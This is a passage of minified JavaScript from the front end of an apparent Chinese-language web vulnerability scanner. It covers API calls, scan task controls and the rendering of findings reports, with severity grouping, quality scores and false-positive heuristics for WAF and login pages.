t=it(e);t&&(i?(t._originalText=t.textContent,t.textContent="处理中...",t.disabled=!0):(t.textContent=t._originalText||t.textContent,t.disabled=!1))}function hi(e,i,t,r){let s=it(e);if(!s)return;if(t<=1){s.innerHTML="";return}let a="",o=5,n=Math.max(1,i-Math.floor(o/2)),d=Math.min(t,n+o-1);d-n<o-1&&(n=Math.max(1,d-o+1)),i>1&&(a+='<button class="page-btn" data-page="'+(i-1)+'">上一页</button>');for(let u=n;u<=d;u++)a+='<button class="page-btn '+(u===i?"active":"")+'" data-page="'+u+'">'+u+"</button>";i<t&&(a+='<button class="page-btn" data-page="'+(i+1)+'">下一页</button>'),s.innerHTML=a,s.querySelectorAll(".page-btn").forEach(function(u){u.addEventListener("click",function(){let h=parseInt(this.dataset.page,10);r&&r(h)})})}var or={header:"相关响应头",detected:"检测结果",reason:"判断依据",impact:"影响说明",value:"当前值",check_scope:"检测范围",limitation:"检测局限",param:"问题参数",payload:"测试 Payload",url:"问题 URL",path:"暴露路径",status:"响应状态",snippet:"内容片段",library:"组件名称",version:"当前版本",detected_version:"当前版本",min_safe_version:"安全版本",cve:"关联 CVE",missing_flags:"缺失安全标志",redirect_to:"重定向目标",os:"操作系统",body_hint:"响应特征",days_left:"证书剩余天数",method:"检测方法"},lr=["detected","header","reason","impact","value","check_scope","limitation","param","payload","url","path","status","snippet","library","version","detected_version","min_safe_version","cve","missing_flags","redirect_to","os","body_hint","days_left","method"];function li(e){if(!e||typeof e!="object")return"";let i=Object.keys(e).filter(function(s){return e[s]!==void 0&&e[s]!==null&&e[s]!==""});if(i.length===0)return"";let t=[];return lr.forEach(function(s){i.indexOf(s)>=0&&t.push(s)}),i.forEach(function(s){t.indexOf(s)<0&&t.push(s)}),'<div style="margin-top:10px">'+t.map(function(s){let a=or[s]||s,o=e[s],n="";if(s==="detected"){let d=o?"#c75450":"#73c990",u=o?"已检测到":"未检测到";n='<span style="color:'+d+';font-weight:600;font-size:12px">'+u+"</span>"}else if(s==="payload")n='<code style="background:#3b0d0d;color:#fecaca;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all;border:1px solid rgba(199,84,80,0.35)">'+w(o)+"</code>";else if(s==="url"||s==="path")n='<code style="background:#2b2b2b;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all">'+w(o)+"</code>";else if(s==="cve"){let d=String(o),u=d.match(/CVE-\d{4}-\d{4,7}/gi)||[];if(u.length>0){n=u.map(function(c){return'<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 8px;border-radius:2px;font-size:11px;font-weight:700;letter-spacing:0.3px">'+w(c)+"</span>"}).join(" ");let h=d.replace(/CVE-\d{4}-\d{4,7}/gi,"").replace(/[,\s、，；;]+/g," ").trim();h&&(n+=' <span style="font-size:12px;color:var(--text-secondary)">'+w(h)+"</span>")}else n='<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 8px;border-radius:2px;font-size:11px;font-weight:700">'+w(d)+"</span>"}else s==="missing_flags"?n=(Array.isArray(o)?o:[o]).map(function(u){return'<code style="background:rgba(240,167,50,0.1);color:#f0a732;padding:2px 8px;border-radius:2px;font-size:12px">'+w(u)+"</code>"}).join(" "):s==="status"||s==="days_left"?n='<span style="font-weight:600;color:var(--text-primary);font-size:12px">'+w(o)+"</span>":s==="snippet"?n='<code style="background:#1e293b;color:#e2e8f0;padding:6px 8px;border-radius:2px;font-size:11px;word-break:break-all;display:block;white-space:pre-wrap;max-height:160px;overflow:auto">'+w(o)+"</code>":n='<span style="font-size:12px;color:var(--text)">'+w(o)+"</span>";return'<div style="margin-bottom:8px"><span style="display:inline-block;min-width:80px;color:var(--text-secondary);font-size:12px;font-weight:600">'+a+"</span> "+n+"</div>"}).join("")+"</div>"}let di=[],At=0;const dr=3,cr=2500;function T(e,i){di.push({msg:e,type:i}),Qi()}function Qi(){if(At>=dr||di.length===0)return;let e=di.shift();At++;let i=document.getElementById("toast-container");if(!i){At--;return}let t=document.createElement("div");t.className="toast";let r="ℹ️";e.type==="error"?r="[错误]":e.type==="success"?r="[成功]":e.type==="warn"&&(r="[警告]");let s=document.createElement("span");s.textContent=r+" ",s.style.marginRight="6px",t.appendChild(s),t.appendChild(document.createTextNode(e.msg)),e.type==="error"?t.classList.add("error"):e.type==="success"&&t.classList.add("success"),i.appendChild(t),requestAnimationFrame(function(){requestAnimationFrame(function(){t.classList.add("show")})}),setTimeout(function(){t.classList.add("hiding"),t.classList.remove("show"),setTimeout(function(){t.parentNode&&t.parentNode.removeChild(t),At--,Qi()},300)},cr)}function en(e){return e?String(e).replace(/\/+$/,""):""}function tn(){const e=[];typeof window<"u"&&window.__CONFIG__&&window.__CONFIG__.api_base_url&&e.push(en(window.__CONFIG__.api_base_url));const i=typeof window<"u"&&(window.location.protocol==="tauri:"||window.location.protocol==="asset:"||window.location.hostname==="tauri.localhost");return typeof window<"u"&&(window.location.protocol==="http:"||window.location.protocol==="https:")&&!i&&e.push(""),e.push("http://127.0.0.1:8011"),e.push("http://127.0.0.1:8000"),[...new Set(e)]}const Pi=tn()[0]||"";async function Ze(e){const i=e.headers&&e.headers.get("content-type")||"",r=(await e.text()).trim();if(/^<!doctype\s+html\b/i.test(r)||/^<html[\s>]/i.test(r)||!i.toLowerCase().includes("json")&&r.startsWith("<"))throw new Error("本地后端没有正确响应，请确认安装包内本地服务已启动后重试");if(!r)return{};try{return JSON.parse(r)}catch{throw new Error("本地后端返回了无效数据，请重启安装包后重试")}}function pr(e){return new Promise(function(i){setTimeout(i,e)})}function nn(){try{return localStorage.getItem("vs_token")}catch{return null}}function ur(){try{localStorage.removeItem("vs_token")}catch{}}function he(){return!!nn()}function rn(e){try{localStorage.setItem("vs_role",e||"member")}catch{}}function fr(){const e=nn(),i={"Content-Type":"application/json"};return e&&(i.Authorization="Bearer "+e),i}async function ce(e,i={}){i.headers=Object.assign({},fr(),i.headers||{});const t=!!i.skipAuthExpiry,r=tn(),s=[];for(const n of r){const d=en(n),u=d?d+e:e;s.push(u),e.startsWith("/api/")&&!e.startsWith("/api/v1/")&&d&&s.push(d+"/api/v1"+e.slice(4))}let a=null,o=null;for(const n of s){let d=0;for(;d<2;)try{const u=await fetch(n,i);if(a=u,u.status===404&&s.length>1)break;if(u.status===401&&!t){ur();try{localStorage.removeItem("vs_username")}catch{}throw new Error("登录状态已过期，请重新登录后再继续使用扫描功能")}return u}catch(u){if(o=u,d+=1,d<2){await pr(250);continue}break}}if(a)return a;throw o&&o.message?new Error("无法连接扫描服务，请确认本地后端已启动"):new Error("无法连接扫描服务，请确认本地后端已启动")}async function Re(e,i){const t=await ce(e,{skipAuthExpiry:!0,method:"POST",body:JSON.stringify(i)}),r=await Ze(t);return r&&typeof r=="object"&&(r._status=t.status,r._statusText=t.statusText),r}async function ke(e){const i=await ce(e),t=await Ze(i);return t&&typeof t=="object"&&(t._status=i.status,t._statusText=i.statusText),t}async function gr(e){const i=await ce(e,{method:"DELETE"}),t=await Ze(i);return t&&typeof t=="object"&&(t._status=i.status,t._statusText=i.statusText),t}async function vr(e,i){const t=await ce(e,{method:"PATCH",body:JSON.stringify(i)}),r=await Ze(t);return r&&typeof r=="object"&&(r._status=t.status,r._statusText=t.statusText),r}function hr(){return ke("/api/config")}function mr(){return ke("/api/me/credits")}function yr(e=20,i=0){return ke("/api/usage?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i))}function br(e){return Re("/api/scan",e)}function xr(e=""){return ke("/api/scan/tasks"+(e?"?status="+encodeURIComponent(e):""))}function wr(e){return Re("/api/scan/tasks/"+encodeURIComponent(e)+"/pause",{})}function kr(e){return Re("/api/scan/tasks/"+encodeURIComponent(e)+"/resume",{})}function _r(e){return Re("/api/scan/tasks/"+encodeURIComponent(e)+"/cancel",{})}function Sr(e){return Re("/api/scan/tasks/"+encodeURIComponent(e)+"/retry",{})}function Er(e){return Re("/api/fix-tickets",e)}function zr(e){return ke("/api/fix-tickets")}function _t(e,i){return vr("/api/fix-tickets/"+e,i)}function sn(e){return gr("/api/fix-tickets/"+e)}function Ir(e,i="markdown"){return ce("/api/fix-tickets/"+e+"/export?format="+encodeURIComponent(i),{method:"GET"})}function Cr(){return ke("/api/fix-tickets/meta/collaborators")}function Tr(e=50,i=0,t="",r={}){let s="/api/admin/audit-logs?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i);return t&&(s+="&action="+encodeURIComponent(t)),["user_id","username","resource_type","resource_id","status","start_at","end_at"].forEach(function(a){r[a]&&(s+="&"+a+"="+encodeURIComponent(r[a]))}),ke(s)}function Ar(){return ke("/api/admin/audit-logs/summary")}function Lr(e=30){return ke("/api/admin/dashboard/stats?days="+encodeURIComponent(e))}async function Br(e={}){const i=new URLSearchParams(e).toString(),t=await ce("/api/admin/audit-logs/export"+(i?"?"+i:""),{skipAuthExpiry:!0}),r=await t.text();if(!t.ok){let s="日志导出失败";try{s=JSON.parse(r).detail||s}catch{}throw new Error(s)}return{content:r,filename:"audit-logs.csv"}}function Or(e=50,i=0,t="",r=""){let s="/api/admin/email-logs?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i);return t&&(s+="&email_type="+encodeURIComponent(t)),r&&(s+="&status="+encodeURIComponent(r)),ke(s)}function Rr(e="",i="",t=""){let r="/api/admin/users?limit=100";return e&&(r+="&query="+encodeURIComponent(e)),i&&(r+="&role="+encodeURIComponent(i)),t!==""&&(r+="&active="+encodeURIComponent(t)),ke(r)}async function an(e,i){const t=await ce("/api/admin/users/"+encodeURIComponent(e),{method:"PATCH",headers:{"X-Admin-Confirm":"CONFIRM"},body:JSON.stringify(i)});return Ze(t)}function Mr(e){return ce("/api/report/src-export",{method:"POST",body:JSON.stringify(e)})}function Pr(e){return Re("/api/finding/verify-reproduce",e)}function Fr(e){return Re("/api/finding/feedback",e)}function jr(){return ke("/api/billing/plans")}function Hr(e){return Re("/api/billing/order",e)}function Nr(e){return ke("/api/billing/order/"+encodeURIComponent(e))}function Dr(e=50,i=0){return ke("/api/billing/recharges?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i))}const Ur=(...e)=>typeof window.navigateTo=="function"&&window.navigateTo(...e),qt={critical:0,high:1,medium:2,low:3,info:4},on={critical:"严重",high:"高危",medium:"中危",low:"低危",info:"信息"},ln={critical:"high",high:"high",medium:"medium",low:"low",info:"info"},dn={sqli:"SQL 注入",xss:"跨站脚本",csrf:"跨站请求伪造",ssti:"模板注入",open_redirect:"开放重定向",cmdi:"命令注入",traversal:"路径遍历",deserialization:"不安全反序列化",ssrf:"服务端请求伪造",xxe:"XML 外部实体注入",idor:"不安全直接对象引用",info_leak:"信息泄露",auth_weakness:"认证薄弱",bruteforce_protection:"防爆破不足",unauthorized_access:"未授权访问",api_auth_missing:"API 鉴权缺失",sensitive_config_exposure:"敏感配置泄露",clickjacking:"点击劫持",file_upload:"不安全文件上传",logic_bypass:"业务逻辑绕过",sri_missing:"SRI 完整性缺失",supply_chain_exposure:"供应链风险"},$r=[{label:"公开暴露面",types:new Set(["discovery_exposure","well_known_exposure","exposed_endpoint","backup_exposure","sensitive_path","sensitive_config_exposure","directory_listing","server_exposure","info_leak","passive_exposure","api_surface_exposure"]),keywords:["敏感路径","敏感文件","备份","目录","信息泄露","source map","调试","公开","well-known","api 文档","swagger","openapi","metrics","actuator","console","phpinfo"]},{label:"配置与响应头",types:new Set(["header_missing","cookie_security","cors_misconfig","csp_weakness","trace_method","ssl"]),keywords:["CSP","Cookie","CORS","HSTS","X-Frame-Options","TRACE","TLS","HTTPS"]},{label:"认证与授权",types:new Set(["csrf","auth_weakness","bruteforce_protection","api_auth_missing","broken_access_control","idor","unauthorized_access","logic_bypass","clickjacking"]),keywords:["认证","授权","登录","越权","权限","爆破","CSRF","IDOR","劫持"]},{label:"注入与输入验证",types:new Set(["sqli","ssti","reflected_xss","xxe","cmdi","traversal","ssrf","open_redirect","deserialization"]),keywords:["注入","XSS","XXE","命令","遍历","SSRF","重定向","反序列化"]},{label:"组件与供应链",types:new Set(["outdated_component","supply_chain_exposure"]),keywords:["组件","框架","版本","CVE","供应链","第三方资源","明文资源"]}],Fi={公开暴露面:0,配置与响应头:1,认证与授权:2,注入与输入验证:3,组件与供应链:4,其他风险:5};let je=[],Wt=0,dt="generic",Pe=null,mi="",Ye=!1,cn=0,Nt={total:0,fp_count:0};function qr(e){if(!e||!Array.isArray(e.findings)||e.findings.length===0)return!1;const i=e.findings[0];return i&&typeof i=="object"&&"id"in i&&"severity"in i&&"evidence"in i}function pn(e){const i=String((e==null?void 0:e.type)||(e==null?void 0:e.vulnerability_type)||"").toLowerCase(),t=[e==null?void 0:e.name,e==null?void 0:e.title,e==null?void 0:e.summary,e==null?void 0:e.description,i].filter(Boolean).join(" ").toLowerCase();for(const r of $r)if(r.types.has(i)||r.keywords.some(s=>t.includes(s.toLowerCase())))return r.label;return"其他风险"}function un(e){const i=new Map;return(e||[]).forEach(t=>{const r=pn(t);i.has(r)||i.set(r,{label:r,items:[],counts:{critical:0,high:0,medium:0,low:0,info:0}});const s=i.get(r);s.items.push(t);const a=String((t==null?void 0:t.severity)||"info").toLowerCase();s.counts[Object.prototype.hasOwnProperty.call(s.counts,a)?a:"info"]+=1}),Array.from(i.values()).sort((t,r)=>{const s=["critical","high","medium","low","info"].find(n=>(t.counts[n]||0)>0)||"info",a=["critical","high","medium","low","info"].find(n=>(r.counts[n]||0)>0)||"info",o=(qt[s]??99)-(qt[a]??99);return o!==0?o:r.items.length!==t.items.length?r.items.length-t.items.length:(Fi[t.label]??99)-(Fi[r.label]??99)})}function Wr(e){const i=un(e);if(i.length===0)return"";const t=i.slice(0,4).map(r=>{const s=r.counts,a=["critical","high","medium","low","info"].find(n=>(s[n]||0)>0)||"info";return`
      <div class="${a==="critical"||a==="high"?"surface-card critical":a==="medium"?"surface-card medium":"surface-card low"}">
        <div class="surface-card-head">
          <span class="surface-card-title">${w(r.label)}</span>
          <span class="surface-card-badge">${w(a)}</span>
        </div>
        <div class="surface-card-count">${r.items.length}</div>
        <div class="surface-card-detail">严重 ${s.critical} / 高危 ${s.high} / 中危 ${s.medium} / 低危 ${s.low} / 信息 ${s.info}</div>
      </div>
    `}).join("");return`
    <div class="src-surface-overview fade-in-up">
      <div class="src-surface-overview-head">
        <div>
          <div class="src-surface-overview-title">风险面总览</div>
          <div class="src-surface-overview-subtitle">建议先查看风险面分布，再进入问题明细与证据详情。</div>
        </div>
        <div class="src-surface-overview-pill">${i.length} 个风险面</div>
      </div>
      <div class="src-surface-grid">${t}</div>
    </div>
  `}function Zr(e,i){const t=un(e);if(t.length===0)return{managementSummary:"当前未发现需要升级处理的风险面，可作为本次版本的基线记录。",priorities:["继续保持现有安全基线，并在后续版本变更后复扫确认。","将当前结果与修复记录一并留档，便于后续验收比对。","对新增页面、接口和第三方资源保持持续监控。"]};const r=t.slice(0,3).map(d=>{const u=d.counts,h=["critical","high","medium","low","info"].find(c=>(u[c]||0)>0)||"info";return`${d.label}${d.items.length}项，最高${h}`}),s=i.fp_count||0,a="当前主要风险面集中在 "+r.join("；")+"。结果已按可信度和验证状态分层，可直接用于客户沟通与整改排期。",n=[(i.critical||0)+(i.high||0)>0?"先关闭严重和高危项，优先收口已经暴露到公网边界的入口与配置缺口。":"先处理中危项和集中风险面，避免问题在后续版本中继续扩散。","再对已验证项完成修复、回归和留档，确保这次整改可以复测、可以交付。",s>0?"最后安排建议复核项的人工确认，区分真实问题与防护页、软 404 等干扰信号。":"最后把本次结果沉淀为安全基线，作为后续版本对比和验收依据。"];return{managementSummary:a,priorities:n}}function fn(e){je=Gr(e.findings||[]),Wt=0,dt="generic",Ye=!1,Pe=e.scan_id||null,mi=e.url||"",cn=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,Nt=e.summary||{critical:0,high:0,medium:0,low:0,info:0,total:0,fp_count:0};const i=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,t=e.summary||{critical:0,high:0,medium:0,low:0,info:0,total:0},r=e.risk_level||"未知",s=e.url||"",a=document.getElementById("result-content")||document.getElementById("result-container");if(!a){setTimeout(()=>fn(e),0);return}let o="";o+=Jr(i,r,t,s,e),e.quality&&e.quality.overall_score!==void 0&&(o+=Xr(e.quality,e.dedup_stats)),o+=Wr(je);const n=je.length>0?je[0]:null;o+='<div class="src-result-layout">',o+='<div class="src-result-sidebar">'+Kr(je,Wt)+"</div>",o+='<div class="src-result-detail" id="src-detail-panel">'+yi(n)+"</div>",o+="</div>",a.innerHTML=o,es(),Vr()}function Xr(e,i){const t=e.overall_score||0,r=t>=80?"#73c990":t>=60?"#f0a732":"#c75450",s=e.coverage_score||0,a=e.reliability_score||0,o=e.depth_score||0,n=e.recommendations||[],d=e.coverage_breakdown||{},u=e.reliability_breakdown||{},h=d.types_detected||[],c=i||{},p=c.original_count!==void 0?`<div class="src-quality-dedup">
         <span class="src-quality-label">去重统计</span>
         <span class="src-quality-stat">原始 ${c.original_count||0}</span>
         <span class="src-quality-arrow">→</span>
         <span class="src-quality-stat highlight">${c.deduplicated_count||0}</span>
         ${c.duplicate_count>0?`<span class="src-quality-tag">移除重复 ${c.duplicate_count}</span>`:""}
         ${c.correlation_groups>0?`<span class="src-quality-tag">关联组 ${c.correlation_groups}</span>`:""}
       </div>`:"",v=u.fp_rate!==void 0?(u.fp_rate*100).toFixed(0)+"%":"-",m=u.high_confidence_rate!==void 0?(u.high_confidence_rate*100).toFixed(0)+"%":"-";return`
    <div class="src-quality-panel" id="src-quality-panel">
      <div class="src-quality-header" id="src-quality-toggle">
        <div class="src-quality-score-wrap">
          <div class="src-quality-ring" style="border-color:${r}">
            <span style="color:${r};font-size:22px;font-weight:700">${t}</span>
          </div>
          <span class="src-quality-title">扫描可信度</span>
        </div>
        <div class="src-quality-bars">
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">覆盖度</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${s}%;background:${s>=80?"#73c990":s>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${s}</span>
          </div>
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">可靠性</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${a}%;background:${a>=80?"#73c990":a>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${a}</span>
          </div>
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">深度</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${o}%;background:${o>=80?"#73c990":o>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${o}</span>
          </div>
        </div>
        <button class="src-quality-expand" id="src-quality-expand-btn">展开</button>
      </div>
      <div class="src-quality-detail" id="src-quality-detail" style="display:none">
        <div class="src-quality-grid">
          <div class="src-quality-section">
            <div class="src-quality-section-title">覆盖说明</div>
            <div class="src-quality-section-body">
              <div class="src-quality-kv"><span>检测漏洞类型</span><code>${h.length} 种</code></div>
              <div class="src-quality-kv"><span>类型列表</span><code>${w(h.join(", ")||"-")}</code></div>
              <div class="src-quality-kv"><span>总发现数</span><code>${d.total_findings||0}</code></div>
            </div>
          </div>
          <div class="src-quality-section">
            <div class="src-quality-section-title">可信度与复核</div>
            <div class="src-quality-section-body">
              <div class="src-quality-kv"><span>误报率</span><code>${v}</code></div>
              <div class="src-quality-kv"><span>高置信度比例</span><code>${m}</code></div>
              <div class="src-quality-kv"><span>建议复核数</span><code>${u.fp_count||0}</code></div>
              <div class="src-quality-kv"><span>高置信度数</span><code>${u.high_confidence_count||0}</code></div>
              <div class="src-quality-kv"><span>确认数</span><code>${d.confirmed_count||0}</code></div>
            </div>
          </div>
        </div>
        ${p}
        ${n.length>0?`
          <div class="src-quality-recommendations">
            <div class="src-quality-section-title">建议</div>
            <ul class="src-quality-rec-list">
              ${n.map(g=>`<li>${w(g)}</li>`).join("")}
            </ul>
          </div>
        `:""}
      </div>
    </div>
  `}function Vr(){const e=document.getElementById("src-quality-toggle"),i=document.getElementById("src-quality-detail"),t=document.getElementById("src-quality-expand-btn");!e||!i||!t||(e.addEventListener("click",function(r){if(r.target===t)return;const s=i.style.display!=="none";i.style.display=s?"none":"block",t.textContent=s?"查看明细":"收起"}),t.addEventListener("click",function(r){r.stopPropagation();const s=i.style.display!=="none";i.style.display=s?"none":"block",t.textContent=s?"查看明细":"收起明细"}))}function Gr(e){return e.slice().sort((i,t)=>{const r=ji(i.verification_status),s=ji(t.verification_status);if(r!==s)return r-s;const a=i.is_likely_fp?1:0,o=t.is_likely_fp?1:0;if(a!==o)return a-o;const n=qt[(i.severity||"").toLowerCase()]??99,d=qt[(t.severity||"").toLowerCase()]??99;return n!==d?n-d:(t.severity_score||0)-(i.severity_score||0)})}function ji(e){const i=String(e||"").toLowerCase();return i==="confirmed"?0:i==="probable"?1:i==="suspected"?2:3}function gn(e){const i=(e||[]).join(" ").toLowerCase(),t=[];return/cloudflare|akamai|incapsula|sucuri|cdn|waf|challenge|verify you are human|security check|bot detection/.test(i)&&t.push("CDN / WAF / 挑战页"),/login|log in|sign in|authentication|认证墙|password|csrf token/.test(i)&&t.push("登录墙 / 认证页"),/soft 404|page not found|not found|does not exist|模板错误页|通用错误页|404/.test(i)&&t.push("软 404 / 模板错误页"),t.length===0&&e&&e.length>0&&t.push("建议复核"),t}function Jr(e,i,t,r,s){const a=Ht(e);Ut(e);const o=Yi(i),n=s.duration_ms?`<span class="meta-item">耗时 ${s.duration_ms}ms</span>`:"",d=s.scan_id?`<span class="meta-item">扫描 #${s.scan_id}</span>`:"",u=s.report_share_id?`<span class="meta-item">报告 ${w(s.report_share_id)}</span>`:"",h=s.scan_id&&he()?'<button class="src-export-btn" id="src-export-markdown" title="导出 SRC 格式 Markdown 报告">导出 SRC 报告</button>':"",p=(s.quality||{}).overall_score||0,v=p>0?`<span class="meta-item" style="color:${p>=80?"#73c990":p>=60?"#f0a732":"#c75450"}">质量 ${p}分</span>`:"",m=s.verification_stats||{},g=m.enabled?`<span class="meta-item verification-badge">
        <span class="v-confirmed" title="已验证">${m.confirmed||0}</span>
        <span class="v-probable" title="已验证/可信">${m.probable||0}</span>
        <span class="v-suspected" title="待人工复核">${m.suspected||0}</span>
       </span>`:"",y=t.total||0,b=t.fp_count||0,_=Math.max(0,y-b),x=t.critical||0,I=t.high||0,z=t.medium||0,M=t.low||0,O=t.info||0,j=x+I>0?"优先关闭已确认高危暴露面，再安排复测确认修复是否生效。":z>0?"先处理中危项，再复扫验证修复是否生效。":"当前结果偏健康，可作为客户基线留存并持续监控。",P="本次检测共输出 "+y+" 项结果，其中 "+_+" 项建议优先处置，"+b+" 项建议复核。",H="本报告适用于授权范围内的客户交付、复测留档与整改跟踪，已优先突出高风险、已验证项与待复核项，便于直接进入处置流程。",K=s.scan_id?'<div class="src-report-action-hint src-report-action-hint-alert">建议优先处置已验证项，再安排人工复核建议复核项。</div>':"",E=Zr(je,t),N=E.priorities.map((l,L)=>`<div class="src-report-priority-item"><span class="src-report-priority-index">${L+1}</span><span>${w(l)}</span></div>`).join("");return`
    <div class="src-report-header fade-in-up">
      <div class="src-score-wrap">
        <div class="src-score-ring" style="background:${a};color:#fff">
          <div class="src-score-value">${e}</div>
          <div class="src-score-label">安全评分</div>
        </div>
      </div>
      <div class="src-report-meta">
        <div class="src-report-title-row">
          <span class="risk-badge ${o}">${w(i)}</span>
          <span class="src-report-url">${w(r)}</span>
        </div>
        <div class="src-report-stats">
          <div class="src-stat critical"><div class="num">${x}</div><div class="label">严重</div></div>
          <div class="src-stat high"><div class="num">${I}</div><div class="label">高危</div></div>
          <div class="src-stat medium"><div class="num">${z}</div><div class="label">中危</div></div>
          <div class="src-stat low"><div class="num">${M}</div><div class="label">低危</div></div>
          <div class="src-stat info"><div class="num">${O}</div><div class="label">信息</div></div>
          <div class="src-stat total"><div class="num">${y}</div><div class="label">总计</div></div>
          <div class="src-stat" style="background:rgba(115,201,144,0.08)"><div class="num" style="color:#73c990">${_}</div><div class="label">待处理</div></div>
        </div>
        <div class="src-report-submeta">
          ${d}${n}${u}${v}${g}
          <span class="meta-item">发现于 ${Jt(s.discovered_at||new Date().toISOString())}</span>
        </div>
        <div class="src-report-actions">
          ${h}
          <button class="src-export-btn" id="src-copy-summary" title="复制当前报告摘要">复制摘要</button>
        </div>
        <div class="src-report-summary">${w(P)}</div>
        <div class="src-report-intro">${w(H)}</div>
        <div class="src-report-exec-summary">
          <div class="src-report-exec-title">执行摘要</div>
          <div class="src-report-exec-text">结果已按风险等级、验证状态、证据完整度和可信度分层整理，建议复核项已单独标出，适合直接用于客户沟通、整改排期与验收留档。</div>
        </div>
        <div class="src-report-capability">
          <div class="src-report-capability-title">管理层关注</div>
          <div class="src-report-capability-text">${w(E.managementSummary)}</div>
        </div>
        <div class="src-report-capability">
          <div class="src-report-capability-title">检测摘要</div>
          <div class="src-report-capability-grid">
            <div class="src-report-capability-item"><span>已验证</span><strong>${m.confirmed||0}</strong></div>
            <div class="src-report-capability-item"><span>建议复核</span><strong>${b}</strong></div>
            <div class="src-report-capability-item"><span>当前重点</span><strong>控制误报 / 保证可交付</strong></div>
          </div>
          <div class="src-report-capability-text">当前更适合做基础安全检测、证据展示、复测验证和整改跟踪；遇到登录墙、WAF/CDN、软 404 等场景会自动降权提示，优先保证结果可信与可交付。</div>
        </div>
        <div class="src-report-next-step">
          <div class="src-report-next-step-title">修复优先级路线</div>
          <div class="src-report-next-step-text">${w(j)}${b>0?" 当前已识别 "+b+" 项建议复核结果，默认优先显示可信项，便于快速进入处置流程。":""}</div>
          <div class="src-report-priority-list">${N}</div>
          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
            <button class="src-filter-btn" onclick="navigateTo('tickets')">工单</button>
            <button class="src-filter-btn" onclick="navigateTo('fixer')">修复</button>
          </div>
          ${K}
        </div>
      </div>
    </div>
  `}function Kr(e,i){let t=Ye?e.filter(a=>!a.is_likely_fp):e,r=e.length-t.length,s='<div class="src-list-header">结果列表 <span class="src-list-count">'+t.length+"</span>";return s+='<button class="src-filter-btn" data-action="toggle-fp-filter" title="切换建议复核项显示">'+(Ye?"显示全部":"优先可信项")+"</button>",r>0&&(s+='<span class="src-filter-note">已隐藏 '+r+" 项</span>"),s+="</div>",s+='<div class="src-list-items">',e.length===0?s+='<div class="src-empty">'+(Ye?"筛选下没有结果":"暂无结果")+"</div>":t.forEach((a,o)=>{const n=(a.severity||"info").toLowerCase(),d=ln[n]||"info",u=o===i?"active":"",h=a.parameter?`<code class="src-list-param">${w(a.parameter)}</code>`:"",c=String(a.type||"").toLowerCase(),p=dn[c]||(a.type?String(a.type).toUpperCase():""),v=p?`<span class="src-list-type">${w(p)}</span>`:"",m=`<span class="src-list-surface">${w(pn(a))}</span>`,g=a.url?new URL(a.url,window.location.href).hostname:"",y=a.url?new URL(a.url,window.location.href).pathname:"",b=gn(Array.isArray(a.fp_reasons)?a.fp_reasons:[]),_=b.length>0?b[0]:"待人工复核",x=a.is_likely_fp?`<span class="src-list-fp-tag src-list-fp-tag-alert" title="建议复核">${w(_)}</span>`:"",I=a.correlation_group?`<span class="src-list-corr" title="关联组 ${xe(a.correlation_group)}（${a.correlation_size||0} 个相关）">${w(a.correlation_group)}</span>`:"",z=a.merged_count>1?`<span class="src-list-merged" title="合并了 ${a.merged_count} 个重复项">×${a.merged_count}</span>`:"",M=a.finding_status||a.verification_status,O=a.status_label||{confirmed:"已确认",excluded:"已排除",suspected:"疑似",unverified:"未验证",probable:"疑似"}[M]||"未验证",j=M?`<span class="src-list-v ${w(M)}" title="${xe(O)}">${w(O)}</span>`:"",P=a.user_feedback?a.user_feedback.is_false_positive?'<span class="src-list-fb fp" title="已标记误报">误报</span>':'<span class="src-list-fb confirmed" title="已确认">确认</span>':"",H=String(a.adjusted_confidence||a.confidence||"medium"),K=H==="high"?"高可信":H==="medium"?"中可信":H==="low"?"低可信":H;s+=`
        <div class="src-list-item ${u} ${d}" data-index="${o}">
          <div class="src-list-row top">
            <span class="src-sev-badge ${d}">${on[n]}</span>
            <span class="src-list-title" title="${xe(a.title||"")}">${w(a.title||"未命名漏洞")}</span>
            ${j}${P}${x}${z}
          </div>
          <div class="src-list-row meta">
            ${v}
            ${m}
            ${h}
            <span class="src-list-host" title="${xe(a.url||"")}">${w(g)}${w(y)}</span>
            <span class="src-list-confidence ${w(H)}">${w(K)}</span>
            ${I}
          </div>
        </div>
      `}),s+="</div>",s}function yi(e,i){if(!e)return'<div class="src-empty-detail">从左侧选择一项查看证据和建议</div>';const t=(e.severity||"info").toLowerCase(),r=ln[t]||"info",s=on[t]||"信息",a=e.evidence||{},o=e.location_detail||{},n={open:"待处理",confirmed:"已确认",false_positive:"误报",fixed:"已修复",unverified:"未验证",suspected:"疑似",excluded:"已排除"},d=e.finding_status||e.status||"unverified",u=Array.isArray(e.fp_reasons)?e.fp_reasons:[],h=gn(u),c=e.is_likely_fp?`<div class="src-fp-banner">
        <div class="src-fp-banner-title">疑似防护页 / 误报，建议优先复核</div>
        <div class="src-fp-banner-desc">${w(h.length>0?h.join(" · "):"页面更像 CDN/WAF 拦截、登录墙、软 404 或挑战页，而不是可直接利用的漏洞。")}</div>
      </div>`:"";let p='<div class="src-detail-card fade-in-up">';if(p+=`<div class="src-detail-header">
    <div class="src-detail-title-row">
      <span class="src-detail-severity ${r}">${s}</span>
      <h2 class="src-detail-title">${w(e.title||"未命名漏洞")}</h2>
      <span class="src-detail-status ${d}">${n[d]||d}</span>
    </div>
    <div class="src-detail-subtitle">
      <code class="src-detail-id">${w(e.id||"")}</code>
      <span class="src-detail-type">${w(dn[String(e.type||"").toLowerCase()]||String(e.type||"").toUpperCase())}</span>
